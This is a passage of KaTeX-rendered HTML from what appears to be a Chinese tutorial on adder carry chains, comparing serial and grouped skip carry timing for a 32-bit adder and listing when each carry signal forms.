style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p>而如果使用串行进位链，则需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">32t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">3</span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></p><p>如果使用单重分组跳跃进位链，则需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">10t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>当n=32时，绘图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618210425045.png" alt="image-20240618210425045" style="zoom:50%;" /><p>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_it_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>形成后：</p><ul><li><p>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">2.5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>1</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>0</mn></msub><mtext>、</mtext><msub><mi>D</mi><mn>1</mn></msub><mo>∼</mo><msub><mi>D</mi><mn>8</mn></msub><mtext>、</mtext><msub><mi>T</mi><mn>1</mn></msub><mo>∼</mo><msub><mi>T</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">C_2、C_1、C_0、D_1\sim D_8、T_1\sim T_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>15</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>11</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>7</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">C_{15}、C_{11}、C_7、C_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">7.5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">7</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>18</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>16</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>14</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>12</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>10</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>8</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>6</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">C_{18}\sim C_{16}、C_{14}\sim C_{12}、C_{10}\sim C_8、C_6\sim C_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>​<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>31</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>27</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>23</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>19</mn></msub></mrow><annotation encoding="application/x-tex">C_{31}、C_{27}、C_{23}、C_{19}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">10t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>30</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>28</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>26</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>24</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>22</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>20</mn></msub></mrow><annotation encoding="application/x-tex">C_{30}\sim C_{28}、C_{26}\sim C_{24}、C_{22}\sim C_{20}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span 